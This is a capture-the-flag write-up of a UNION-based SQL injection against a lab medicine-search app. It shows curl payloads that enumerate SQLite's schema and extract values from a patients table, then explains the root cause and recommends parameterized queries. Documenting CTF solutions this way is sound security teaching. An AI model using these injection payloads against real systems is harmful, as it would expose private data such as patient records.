# Bad Medicine — RSTCON CTF 2026

> **Author:** Fuad Hasan (`t0r3n079`)  
> **Team:** [Red Subversion Force (0xRSF)](https://github.com/redsubversionforce)  
> **Event:** RSTCON CTF 2026  
> **Category:** Web Exploitation  
> **Flag:** Intentionally omitted

**Scope:** This article documents an authorized CTF challenge. Commands and payloads are for the competition lab only.

---

## Bad Medicine — SQL Injection

**Vulnerability:** UNION-based SQL injection (SQLite)  
**Entry point:** Medicine search query parameter (`q`)

### Overview

The application provided a medicine search interface. The search parameter was handled unsafely, allowing a crafted value to alter the SQL query. The challenge path involved identifying the database schema and then extracting data from the `patients` table.

### Step 1 — Establish a session and inspect the search

I started by issuing a normal search request. The sample below saves any session cookies returned by the application for reuse in later requests.

```bash
BASE='https://18.215.143.250:5000'

curl -k -sS -c medvault.cookies -b medvault.cookies \
  --get --data-urlencode 'q=amoxicillin' \
  "$BASE/"
```

**What this established:** The application accepted the `q` parameter as part of its medicine search workflow.

> **Note:** `-k` disables TLS certificate verification and is shown only to reproduce the provided CTF interaction. It should not be a default choice outside a trusted lab.

### Step 2 — Enumerate the database schema

Next, I tested a UNION-based injection against SQLite's `sqlite_master` metadata table:

```bash
curl -k -sS -b medvault.cookies --get \
  --data-urlencode "q=zzzz' UNION SELECT 999,name,type,sql,0 FROM sqlite_master--" \
  "$BASE/"
```

The injected `UNION SELECT` was shaped to fit the original query's **five-column** result structure. SQLite's `sqlite_master` stores schema information, including table names and their creation statements. This was the route used to discover the relevant `patients` table.

### Step 3 — Extract the target value

After identifying the `patients` table and the `phone` column, I used the same injection point to select matching data:

```bash
curl -k -sS -b medvault.cookies --get \
  --data-urlencode "q=zzzz' UNION SELECT 0,phone,'patients',0,0 FROM patients WHERE phone LIKE 'rstcon{%'--" \
  "$BASE/"
```

The `LIKE 'rstcon{%'` condition narrowed the query to values beginning with the challenge flag prefix. The returned result was then inspected to recover the challenge value; the flag itself is not published here.

### Root cause and lesson

The application incorporated untrusted input from `q` into a SQL statement. By changing the query structure with `UNION SELECT`, an attacker could access data unrelated to the intended medicine search.

**Mitigation:** Use parameterized queries for search values, avoid building SQL with string concatenation, and limit the database account's permissions. Input validation can supplement these controls but is not a substitute for parameterization.

---

---

**Written by:** Fuad Hasan (`t0r3n079`) · **Team:** [0xRSF](https://github.com/redsubversionforce)
